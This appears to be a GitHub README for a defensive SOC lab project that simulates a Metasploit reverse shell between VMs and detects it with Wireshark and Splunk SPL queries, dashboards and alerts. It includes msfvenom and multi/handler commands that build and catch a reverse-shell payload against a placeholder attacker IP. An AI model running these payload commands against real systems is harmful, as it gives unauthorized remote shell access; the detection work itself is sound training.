# Reverse Shell Network Detection Study

Part of the [`soc-projects`](https://github.com/Mahmoud320-ht/soc-projects) repository.

A hands-on SOC project simulating a reverse shell attack in an isolated lab, capturing the resulting network traffic with Wireshark, and building Splunk detection logic to flag the abnormal outbound connection it creates.

## Overview

```
Payload Generation  →  Reverse Shell Execution  →  Packet Capture (Wireshark)  →  Connection Logging  →  Detection (Splunk)
```

A victim host (Ubuntu) executes a Metasploit-generated reverse shell payload that connects back to an attacker (Kali Linux) listener. The resulting outbound connection — a host reaching out to an external IP on a non-standard port — is the core anomaly this project detects, first visually in Wireshark, then automatically in Splunk.

## Lab Architecture

| Machine | Role | Purpose |
|---|---|---|
| Kali Linux | Attacker | Hosts the Metasploit listener, captures traffic with Wireshark |
| Ubuntu Server | Victim | Executes the reverse shell payload; connection state logged locally |
| Splunk Cloud | SIEM | Ingests connection logs and detects the suspicious outbound session |

All machines were virtual machines running on an isolated network, owned and controlled by the author.

## Tools Used

- **Kali Linux** — attack platform
- **Metasploit (`msfvenom`, `exploit/multi/handler`)** — payload generation and listener
- **Wireshark** — packet capture and traffic analysis
- **`ss` (socket statistics)** — connection-state logging on the victim
- **Splunk Cloud** — log ingestion, search (SPL), dashboarding, alerting
- **Splunk Universal Forwarder** — forwards connection logs from the victim to Splunk Cloud over SSL

## Implementation

### 1. Listener Setup (Kali)
```bash
msfconsole
use exploit/multi/handler
set payload linux/x64/shell_reverse_tcp
set LHOST <kali-ip>
set LPORT 4444
run
```

### 2. Payload Generation (Kali)
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<kali-ip> LPORT=4444 -f elf -o shell.elf
```
The payload was transferred to the Ubuntu victim via `scp`.

### 3. Packet Capture (Wireshark)
Wireshark was running on Kali before payload execution to capture the full connection setup:
```
tcp.port == 4444
```
This isolates the TCP handshake and session traffic on the handler port, confirming the connection originates **from the victim toward the attacker** — the reverse of normal client-server behavior and the key indicator of a reverse shell.

### 4. Payload Execution (Ubuntu)
```bash
chmod +x shell.elf
./shell.elf
```
Execution opened an interactive command shell session on the Kali listener, confirmed with basic commands (`whoami`, `id`).

### 5. Connection Logging (Ubuntu)
Since reverse shells don't produce a conventional log file, outbound connections were captured periodically with a lightweight monitoring script:

```bash
#!/bin/bash
while true; do
    echo "=== $(date) ==="
    ss -tnp state established
    sleep 5
done >> /var/log/network_connections.log
```

This was forwarded to Splunk Cloud the same way as the first project — via Splunk Universal Forwarder, into a dedicated index (`network_logs`):
```ini
[monitor:///var/log/network_connections.log]
sourcetype = network_connections
index = network_logs
```

### 6. Detection Searches (SPL)

`ss` output packs multiple connections into a single multi-line event, so parsing requires extracting every IP:port pair per event before filtering on the suspicious port.

**Extract all connection pairs per event and expand them:**
```spl
index=network_logs earliest=-15m latest=now
| rex field=_raw max_match=20 "(?<pair>[\d\.]+:\d+\s+[\d\.]+:\d+)\s+users:"
| mvexpand pair
| rex field=pair "(?<local_ip>[\d\.]+):(?<local_port>\d+)\s+(?<dst_ip>[\d\.]+):(?<dst_port>\d+)"
| table _time, local_ip, dst_ip, dst_port
```

**Flag connections on known reverse-shell / non-standard ports:**
```spl
index=network_logs earliest=-5m latest=now
| rex field=_raw max_match=20 "(?<pair>[\d\.]+:\d+\s+[\d\.]+:\d+)\s+users:"
| mvexpand pair
| rex field=pair "(?<local_ip>[\d\.]+):(?<local_port>\d+)\s+(?<dst_ip>[\d\.]+):(?<dst_port>\d+)"
| where dst_port=4444 OR dst_port=1337 OR dst_port=1234 OR dst_port=9001
| table _time, local_ip, dst_ip, dst_port
```

See [`splunk-queries/spl-queries.spl`](./splunk-queries/spl-queries.spl) for the full set.

### 7. Dashboard
Built a Splunk dashboard, **Reverse Shell Network Detection**, with:
- A table of all observed outbound connections
- A filtered view of connections on suspicious/non-standard ports
- A timeline of the suspicious connection's activity

### 8. Threshold / Pattern-Based Alert
Detection logic: flag any established connection where the destination port matches a known reverse-shell port.

```spl
index=network_logs earliest=-5m latest=now
| rex field=_raw max_match=20 "(?<pair>[\d\.]+:\d+\s+[\d\.]+:\d+)\s+users:"
| mvexpand pair
| rex field=pair "(?<local_ip>[\d\.]+):(?<local_port>\d+)\s+(?<dst_ip>[\d\.]+):(?<dst_port>\d+)"
| where dst_port=4444 OR dst_port=1337 OR dst_port=1234 OR dst_port=9001
```

Configured as a **Scheduled Alert**, running every 5 minutes, triggering when results > 0.

## Results

- Successfully generated and executed a Metasploit reverse shell payload against the victim
- Captured and visually confirmed the outbound connection pattern in Wireshark
- Logged connection state on the victim and forwarded it to Splunk Cloud in near real time
- Built a working Splunk search and alert that detects the reverse shell by destination port, independent of the Wireshark capture

## Key Indicators Identified

- **Directionality anomaly**: the victim host initiated the outbound connection, rather than acting purely as a server receiving inbound traffic
- **Non-standard destination port**: port 4444 (a well-known Metasploit default) rather than common service ports (80, 443, 22)
- **Long-lived established session**: the connection persisted in `ESTABLISHED` state for the duration of the shell session

## Mitigation Recommendations

- **Egress filtering** — restrict outbound connections to known, necessary destinations and ports
- **Host-based intrusion detection (HIDS)** — flag unexpected child processes (e.g., `sh`/`bash` with a live network socket)
- **Application allow-listing** — prevent unauthorized binaries like `shell.elf` from executing
- **Network segmentation** — limit lateral movement opportunities if a host is compromised
- **EDR / process monitoring** — detect reverse shell behavior at the process level, not just the network level

## Repository Contents

```
reverse-shell-network-detection/
├── README.md
├── splunk-queries/
│   └── spl-queries.spl          # All SPL queries used, documented
├── configs/
│   ├── inputs.conf.example      # Sanitized forwarder config
│   └── log_connections.sh       # Connection-logging script used on the victim
└── screenshots/                  # Evidence: msfconsole session, Wireshark capture, dashboard, alerts
```

## Skills Demonstrated

- Payload generation and handler configuration with Metasploit
- Network traffic analysis with Wireshark
- Linux connection-state monitoring (`ss`)
- SIEM operations (Splunk Cloud, Universal Forwarder, indexes)
- Advanced SPL: multi-value field extraction (`rex max_match`, `mvexpand`) for parsing non-standard log formats
- Network-based anomaly detection design

## Disclaimer

This project was conducted entirely within an isolated lab environment using virtual machines owned and controlled by the author, for educational purposes only. No unauthorized systems were accessed or tested.
